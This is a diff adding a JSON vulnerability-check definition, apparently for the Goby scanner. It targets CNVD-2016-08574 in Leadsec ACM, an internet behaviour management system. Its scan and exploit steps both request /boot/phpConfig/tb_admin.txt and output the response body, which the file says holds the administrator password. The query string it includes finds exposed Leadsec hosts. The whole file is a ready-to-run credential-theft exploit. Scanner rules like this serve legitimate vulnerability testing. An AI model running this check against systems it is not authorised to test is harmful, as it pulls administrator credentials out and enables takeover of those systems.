@@ -1,0 +1,85 @@
+{
+      "Name": "Leadsec ACM infoleak CNVD-2016-08574",
+      "Level": "1",
+      "Tags": [
+            "infoleak"
+      ],
+      "GobyQuery": "product=\"Leadsec\"",
+      "Description": "Leadsec Online Behavior Management System (Leadsec ACM for short) is a comprehensive solution provided by Leadsec for Internet access users in terms of information content security, network application management, organizational operation efficiency, network resource utilization, legal risk avoidance and network investment return.",
+      "Product": "Leadsec-Employee-Internet-Management",
+      "Homepage": "http://www.leadsec.com.cn/",
+      "Author": "",
+      "Impact": "There is an information leakage vulnerability in the Net Royal Nebula Internet Behavior Management System. Since the account password information is stored in the boot/phpConfig/tb_admin.txt file, and the file can be accessed directly, the attacker is allowed to log in to the system background and obtain administrator rights.",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2016-08574"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/boot/phpConfig/tb_admin.txt",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/boot/phpConfig/tb_admin.txt",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
